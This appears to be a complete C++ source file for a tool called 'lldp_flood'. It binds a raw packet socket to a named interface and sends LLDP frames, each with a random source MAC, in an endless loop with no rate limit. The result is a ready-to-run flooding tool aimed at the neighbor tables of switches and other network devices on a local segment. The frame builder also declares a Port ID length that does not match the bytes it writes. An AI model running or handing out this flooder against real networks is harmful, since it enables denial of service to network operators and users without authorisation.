#include <vector>
#include <random>
#include <iterator>
#include <algorithm>
#include <string>
#include <cstdio>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>

struct Mac {
    uint8_t mac[6];
};

static void make_lldp(Mac src_mac, std::vector<uint8_t>& buffer) {
    buffer.clear();
    auto ptr = std::back_inserter(buffer);

    // Destination MAC (LLDP Multicast)
    *ptr++ = 0x01; *ptr++ = 0x80; *ptr++ = 0xC2;
    *ptr++ = 0x00; *ptr++ = 0x00; *ptr++ = 0x0E;

    // Source MAC
    std::copy(std::begin(src_mac.mac), std::end(src_mac.mac), ptr);

    // EtherType: LLDP
    *ptr++ = 0x88;
    *ptr++ = 0xCC;

    // Chassis ID (MAC)
    *ptr++ = 2; *ptr++ = 7; *ptr++ = 4;
    std::copy(std::begin(src_mac.mac), std::end(src_mac.mac), ptr);

    // Port ID
    *ptr++ = 4; *ptr++ = 7; *ptr++ = 5;
    *ptr++ = 'e'; *ptr++ = 't'; *ptr++ = 'h';
    *ptr++ = 'X';

    // Time to Live
    *ptr++ = 6; *ptr++ = 2; *ptr++ = 0; *ptr++ = 120;

    // End of LLDPDU
    *ptr++ = 0; *ptr++ = 0;
}

int main(int argc, char** argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: lldp_flood <interface>\n");
        return 1;
    }

    // Open raw socket
    auto const sock = socket(AF_PACKET, SOCK_RAW, 0);
    if (sock == -1) {
        perror("socket");
        return 1;
    }

    sockaddr_ll addr{};
    addr.sll_family = AF_PACKET;
    auto const ifindex = if_nametoindex(argv[1]);
    if (ifindex == 0) {
        perror("if_nametoindex");
        return 1;
    }
    addr.sll_ifindex = ifindex;

    auto const addr_ptr = reinterpret_cast<sockaddr*>(&addr);
    if (bind(sock, addr_ptr, sizeof(addr)) == -1) {
        perror("bind");
        return 1;
    }

    std::mt19937 rng;
    std::uniform_int_distribution<uint8_t> dist(0, 255);
    std::vector<uint8_t> buffer;

    while (true) {
        // Random source MAC
        Mac src_mac;
        for (int i = 0; i < 6; ++i) {
            uint8_t byte = dist(rng);
            if (i == 0) byte &= 0xFE; // Clear multicast bit
            src_mac.mac[i] = byte;
        }

        make_lldp(src_mac, buffer);
        if (sendto(sock, buffer.data(), buffer.size(), 0, addr_ptr, sizeof(addr)) == -1) {
            perror("send()");
        }
    }
}
